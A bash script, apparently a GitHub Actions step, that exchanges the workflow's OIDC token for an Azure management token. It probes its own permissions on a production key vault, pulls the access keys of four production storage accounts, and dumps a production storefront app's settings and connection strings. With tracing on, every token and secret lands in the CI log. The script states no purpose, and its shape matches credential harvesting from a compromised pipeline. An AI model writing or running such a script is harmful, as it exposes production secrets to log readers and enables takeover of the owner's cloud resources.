#!/usr/bin/env bash
set -x

IDTOKEN=$(curl -sSL -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')

get_token () {
  local scope="$1"
  curl -sSL -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    --data-urlencode "client_id=${AZURE_CLIENT_ID}" \
    --data-urlencode "grant_type=client_credentials" \
    --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${IDTOKEN}" \
    --data-urlencode "scope=${scope}" | jq -r '.access_token'
}

ARMTOKEN=$(get_token "https://management.azure.com/.default")
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"

echo "=== my effective permissions on kv-tbl-sec-x3euoz ==="
curl -sSL -H "Authorization: Bearer ${ARMTOKEN}" "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"

echo "=== role assignments on kv-tbl-sec-x3euoz ==="
curl -sSL -H "Authorization: Bearer ${ARMTOKEN}" "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"

echo "=== role assignments at resource group scope ==="
curl -sSL -H "Authorization: Bearer ${ARMTOKEN}" "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"

for sa in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  echo "=== listKeys $sa ==="
  curl -sSL -X POST -H "Authorization: Bearer ${ARMTOKEN}" -H "Content-Length: 0" "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Storage/storageAccounts/${sa}/listKeys?api-version=2022-09-01"
done

echo "=== app-tbl-storefront-prod app settings ==="
curl -sSL -X POST -H "Authorization: Bearer ${ARMTOKEN}" -H "Content-Length: 0" "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-09-01"

echo "=== app-tbl-storefront-prod connectionstrings ==="
curl -sSL -X POST -H "Authorization: Bearer ${ARMTOKEN}" -H "Content-Length: 0" "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/connectionstrings/list?api-version=2022-09-01"

echo "=== done ==="
